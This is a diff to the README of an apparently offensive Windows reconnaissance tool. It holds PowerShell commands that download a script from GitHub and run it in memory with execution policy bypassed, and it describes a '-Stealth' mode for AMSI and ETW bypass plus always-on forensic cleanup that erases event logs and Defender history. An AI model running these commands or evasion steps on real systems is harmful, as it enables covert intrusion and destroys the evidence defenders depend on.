@@ -29,9 +29,10 @@ SSH into the target machine, open an **elevated PowerShell** prompt, and paste:
 powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gio-zo/WAR---Windows-Automated-Recon/refs/heads/main/Invoke-WindowsRecon.ps1')"
 ```
 
-> Replace `YOUR_USER` with your GitHub username (or use the full raw URL to your repo).
-
 That's it — downloads the script to memory and runs it. No git, no files cloned, no installation.
+
+> By default, EDR evasion (AMSI/ETW bypass) is **OFF** so the script won't be flagged by AV.
+> Add `-Stealth` if you need evasion and the machine is not whitelisted.
 
 ### Alternative: download then run
 
@@ -196,15 +197,25 @@ $HtmlReportFileName = "recon-report.html"  # Output filename
 
 ## EDR Evasion Techniques
 
-| Technique | Purpose |
-|-----------|---------|
-| AMSI bypass (AmsiScanBuffer patch) | Prevents script content scanning by Windows Defender |
-| ETW patch (EtwEventWrite) | Disables .NET/PowerShell telemetry events |
-| In-memory .NET assembly loading | Exe tools never written to disk (avoids AV file scanning) |
-| In-memory PS1 execution | PowerShell scripts loaded as strings (never touch disk) |
-| Randomized filenames | Bat files use random names to avoid signature matching |
-| Randomized User-Agent | Downloads use browser-like User-Agents to avoid network signatures |
-| Forensic cleanup | Removes Prefetch, event logs, PS history, Defender history |
+By default, EDR evasion is **OFF** so the script won't trigger AV. Use `-Stealth` to enable:
+
+```powershell
+# Local:
+.\Invoke-WindowsRecon.ps1 -Stealth
+
+# IEX:
+powershell -ep bypass -c "$env:RECON_STEALTH='1'; IEX(New-Object Net.WebClient).DownloadString('...')"
+```
+
+| Technique | Requires -Stealth | Purpose |
+|-----------|:-:|---------|
+| AMSI bypass (runtime patch) | Yes | Prevents script content scanning by Windows Defender |
+| ETW patch (runtime patch) | Yes | Disables .NET/PowerShell telemetry events |
+| In-memory .NET assembly loading | No (always on) | Exe tools never written to disk (avoids AV file scanning) |
+| In-memory PS1 execution | No (always on) | PowerShell scripts loaded as strings (never touch disk) |
+| Randomized filenames | No (always on) | Bat files use random names to avoid signature matching |
+| Randomized User-Agent | No (always on) | Downloads use browser-like User-Agents to avoid network signatures |
+| Forensic cleanup | No (always on) | Removes Prefetch, event logs, PS history, Defender history |
 
 **When evasion might not work:**
 - Kernel-level EDR hooks (e.g., ETW-TI via EtwThreatIntelProvider) are not bypassed
